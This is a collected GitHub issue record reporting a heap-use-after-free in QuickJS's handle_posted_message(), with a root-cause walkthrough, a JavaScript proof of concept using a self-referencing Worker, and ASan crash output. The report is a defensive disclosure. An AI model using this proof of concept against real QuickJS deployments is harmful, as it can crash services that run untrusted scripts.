@@ -1,0 +1,39 @@
+{
+ "source": "GitHub",
+ "url": "https://github.com/bellard/quickjs/issues/527",
+ "passes": [
+  "offcwe"
+ ],
+ "title": "heap-use-after-free in `handle_posted_message`",
+ "author_login": "smaeljaish771",
+ "status": "ok",
+ "fetched_utc": "2026-10-07T04:22:04Z",
+ "final_url": "https://github.com/bellard/quickjs/issues/527",
+ "repo": "bellard/quickjs",
+ "repo_language": "C",
+ "number": 527,
+ "state": "open",
+ "state_reason": null,
+ "created_at": "2026-06-24T08:16:55Z",
+ "updated_at": "2026-06-24T08:18:32Z",
+ "closed_at": null,
+ "labels": [],
+ "comments_reported": 0,
+ "query_buckets": [
+  "UAF"
+ ],
+ "events": [
+  {
+   "post_type": "issue_body",
+   "post_id": "-",
+   "author_login": "smaeljaish771",
+   "author_association": "NONE",
+   "role": "R",
+   "role_name": "reporter",
+   "created_utc": "2026-06-24T08:16:55Z",
+   "updated_utc": "2026-06-24T08:18:32Z",
+   "permalink": "https://github.com/bellard/quickjs/issues/527",
+   "body_markdown": "QuickJS can hit a heap-use-after-free in `handle_posted_message()` when a\n`Worker` object is collected by cycle GC while its pending message is being\nhandled.\n\nThe vulnerable path is in `quickjs-libc.c`. `handle_posted_message()` receives a\n`JSWorkerMessageHandler *port` from `ts->port_list`, then allocates JS objects\nwhile preparing the message event. Those allocations may trigger GC. If the\nowning `Worker` is only kept alive by a JS self-cycle, GC can finalize it and\nfree `port`. After GC returns, `handle_posted_message()` still reads from the\nsame `port` pointer:\n\n```c\nobj = JS_NewObject(ctx);                         // may trigger GC\n...\nfunc = JS_DupValue(ctx, port->on_message_func); // port may already be freed\n```\n\nThis produces a UAF read in ASan builds and a reliable crash in non-ASan builds.\n\n## Root Cause\n\nThe message handler pointer is not pinned while `handle_posted_message()` runs.\nA simplified flow is:\n\n1. `js_os_poll()` iterates `ts->port_list` and passes a `port` pointer to\n   `handle_posted_message()`.\n2. `handle_posted_message()` removes a pending message and calls\n   `JS_ReadObject()` / `JS_NewObject()` to build the event object.\n3. `JS_NewObject()` can trigger `js_trigger_gc()`.\n4. Cycle GC can collect the owning `Worker` if it is only reachable through a\n   self-cycle such as `w.self_ref = w; w = null;`.\n5. `js_worker_finalizer()` calls `js_free_port()` and frees the same `port`.\n6. Control returns to `handle_posted_message()`, which dereferences\n   `port->on_message_func`.\n\nThe previous Worker freeing fix in commit `728ed94` hardened runtime shutdown\nhandling, but it does not protect this in-flight message handling path.\n\n## Proof of Concept\n\n`poc.js`\n\n```\nimport * as os from 'os';\n\nif (os.Worker.parent) {\n    var largeData = [];\n    for (var i = 0; i < 20000; i++) {\n        largeData.push(\"data_item_\" + i);\n    }\n\n    os.Worker.parent.postMessage(largeData);\n} else {\n    // Main side: run this PoC from its artifact directory so \"poc.js\"\n    // resolves correctly when creating the Worker below.\n    var workerPath = \"poc.js\";\n\n    // Push malloc_size close to the GC threshold. The exact values are\n    // intentionally generous so the allocation in handle_posted_message()\n    // reliably triggers cycle collection on the tested builds.\n    var heap_filler = [];\n    for (var i = 0; i < 3000; i++) {\n        heap_filler.push({a: i, b: i * 2, c: \"x\".repeat(10)});\n    }\n\n    // Create a Worker that will later be reachable only through a self-cycle.\n    var w = new os.Worker(workerPath);\n    w.self_ref = w;\n\n    w.onmessage = function(e) {\n        print(\"Handler called - type:\", typeof e.data);\n    };\n\n    // Drop the external reference. The Worker is now collectable by cycle GC.\n    w = null;\n\n    print(\"Waiting for worker message...\");\n}\n\n```\n\n## Observed Results\n\nOn a non-ASan build, the PoC crashes reliably in this environment:\n\n```text\nSegmentation fault (core dumped)\nexit code: 139\n```\n\nOn an ASan build, it reports a heap-use-after-free:\n\n```text\nERROR: AddressSanitizer: heap-use-after-free\nREAD of size 8\n    #0 JS_DupValue            quickjs.h:710\n    #1 handle_posted_message  quickjs-libc.c:2395\n```\n\nThe free happens during the same `handle_posted_message()` call, from GC entered\nwhile creating the event object:\n\n```text\nfreed by thread T0 here:\n    #1 js_free_port           quickjs-libc.c:3580\n    #2 js_worker_finalizer    quickjs-libc.c:3595\n    #5 gc_free_cycles         quickjs.c:6787\n    #8 js_trigger_gc          quickjs.c:1794\n    #9 JS_NewObjectFromShape  quickjs.c:5619\n    #11 handle_posted_message quickjs-libc.c:2386\n```\n\nASan is not required to trigger the bug; it is only used to show the first invalid access clearly.\n`halt_on_error=0` is not needed. If leak reports are noisy, this is sufficient:\n\n```bash\nASAN_OPTIONS=detect_leaks=0 /path/to/qjs poc.js\n```\n\n[asan_output.log](https://github.com/user-attachments/files/29284162/asan_output.log)\n"
+  }
+ ]
+}
